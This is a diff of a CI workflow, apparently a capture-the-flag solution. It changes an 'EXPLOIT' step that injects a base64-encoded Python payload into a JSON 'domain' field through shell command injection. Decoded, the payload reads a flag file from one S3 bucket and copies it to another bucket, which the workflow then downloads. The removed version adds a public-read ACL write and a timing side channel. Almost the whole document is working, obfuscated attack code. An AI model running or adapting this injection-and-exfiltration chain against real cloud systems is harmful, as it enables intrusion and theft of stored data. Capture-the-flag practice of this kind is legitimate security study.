@@ -23,9 +23,10 @@ jobs:
       - name: Who am I
         run: aws sts get-caller-identity
 
-      - name: EXPLOIT - boto3 write flag to platform-bucket (15s = success)
+      - name: EXPLOIT + IMMEDIATE READ in same step (no inter-step cleanup window)
         run: |
-          B64="aW1wb3J0IGJvdG8zLHN1YnByb2Nlc3Msb3Msc3lzLHRpbWUKcz1ib3RvMy5jbGllbnQoJ3MzJykKc3VjY2Vzcz1GYWxzZQojIFRlc3QgMTogYm90bzMgcmVhZCBmcm9tIGNvZGVjIGJ1Y2tldAp0cnk6CiAgICBmbGFnPXMuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgICMgUmVhZCBzdWNjZWVkZWQhIFRyeSBtdWx0aXBsZSB3cml0ZSBwYXRocwogICAgIyBXcml0ZSBwYXRoIDE6IGJvdG8zIFBVVCB0byBwbGF0Zm9ybS1idWNrZXQKICAgIHRyeToKICAgICAgICBzLnB1dF9vYmplY3QoQnVja2V0PSdwbGF0Zm9ybS1idWNrZXQtMDA5NjYxNzY0MDc3LXVzLWVhc3QtMScsS2V5PSdmbGFnLWJvdG8zLnR4dCcsQm9keT1mbGFnKQogICAgICAgIHN1Y2Nlc3M9VHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgICMgV3JpdGUgcGF0aCAyOiBib3RvMyBQVVQgdG8gY29kZWMgYnVja2V0IChkaWZmZXJlbnQga2V5LCBtYXliZSBsYW1iZGFSb2xlIGhhcyBQdXRPYmplY3QgaW4gSUFNKQogICAgaWYgbm90IHN1Y2Nlc3M6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzLnB1dF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLWV4ZmlsLnR4dCcsQm9keT1mbGFnLEFDTD0ncHVibGljLXJlYWQnKQogICAgICAgICAgICBzdWNjZXNzPVRydWUKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgIGlmIHN1Y2Nlc3M6CiAgICAgICAgdGltZS5zbGVlcCgxMykgICMgU1VDQ0VTUzogcmVhZCArIHdyaXRlIHdvcmtlZCAtPiB+MTVzIHRvdGFsCiAgICBlbHNlOgogICAgICAgIHRpbWUuc2xlZXAoNikgICAjIFJFQUQgT0sgYnV0IG5vIHdyaXRlIHBhdGggd29ya2VkIC0+IH44cyB0b3RhbApleGNlcHQ6CiAgICBwYXNzICAjIFJFQUQgRkFJTEVEOiBubyBleHRyYSBzbGVlcCAtPiB+MS0ycyB0b3RhbAojIFRlc3QgMjogZmluZCBhd3MgYmluYXJ5IGFuZCB0cnkgYXdzIHMzIGNwIChpbiBjYXNlIHRoZSBhYm92ZSBmYWlsZWQpCmlmIG5vdCBzdWNjZXNzOgogICAgZm91bmQ9Tm9uZQogICAgZm9yIHAgaW4gWycvb3B0L2Jpbi9hd3MnLCcvb3B0L2F3cycsJy91c3IvbG9jYWwvYmluL2F3cycsJy91c3IvYmluL2F3cyddOgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHApOgogICAgICAgICAgICBmb3VuZD1wCiAgICAgICAgICAgIGJyZWFrCiAgICBpZiBub3QgZm91bmQ6CiAgICAgICAgcj1zdWJwcm9jZXNzLnJ1bihbJ3doaWNoJywnYXdzJ10sY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUpCiAgICAgICAgaWYgci5yZXR1cm5jb2RlPT0wOgogICAgICAgICAgICBmb3VuZD1yLnN0ZG91dC5zdHJpcCgpCiAgICBpZiBmb3VuZDoKICAgICAgICBmb3IgZGVzdCBpbiBbJ3MzOi8vcGxhdGZvcm0tYnVja2V0LTAwOTY2MTc2NDA3Ny11cy1lYXN0LTEvZmxhZy1yY2UudHh0JywnczM6Ly9jb2RlYzRmMjZjODYyYTMyMWVmNS9mbGFnLWV4ZmlsMi50eHQnXToKICAgICAgICAgICAgb3V0PXN1YnByb2Nlc3MucnVuKFtmb3VuZCwnczMnLCdjcCcsJ3MzOi8vY29kZWM0ZjI2Yzg2MmEzMjFlZjUvZmxhZy50eHQnLGRlc3RdLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKQogICAgICAgICAgICBpZiBvdXQucmV0dXJuY29kZT09MDoKICAgICAgICAgICAgICAgIHN1Y2Nlc3M9VHJ1ZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBpZiBzdWNjZXNzOgogICAgICAgICAgICB0aW1lLnNsZWVwKDEzKQ=="
+          # Inject no-sleep exploit: Lambda reads flag, writes to platform-bucket, returns immediately
+          B64="aW1wb3J0IGJvdG8zCnM9Ym90bzMuY2xpZW50KCdzMycpCnRyeToKICAgIGZsYWc9cy5nZXRfb2JqZWN0KEJ1Y2tldD0nY29kZWM0ZjI2Yzg2MmEzMjFlZjUnLEtleT0nZmxhZy50eHQnKVsnQm9keSddLnJlYWQoKQogICAgcy5wdXRfb2JqZWN0KEJ1Y2tldD0ncGxhdGZvcm0tYnVja2V0LTAwOTY2MTc2NDA3Ny11cy1lYXN0LTEnLEtleT0nZmxhZy1ib3RvMy50eHQnLEJvZHk9ZmxhZykKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -33,20 +34,12 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           echo "Exploit timing: $(( (END - START) / 1000000 ))ms"
-
-      - name: Read flag via cicdRole and save as artifact
-        run: |
-          echo "=== List platform-bucket ==="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
-          echo
-          echo "=== Download flag-boto3.txt ==="
+          echo ""
+          echo "=== Immediately reading flag-boto3.txt as cicdRole ==="
           aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag-boto3.txt flag.txt
-          echo "=== Raw bytes (xxd) ==="
+          echo "=== xxd ==="
           xxd flag.txt
-          echo "=== ASCII ==="
-          cat flag.txt
-          echo
-          echo "=== Base64 ==="
+          echo "=== base64 ==="
           base64 flag.txt
 
       - name: Upload flag artifact
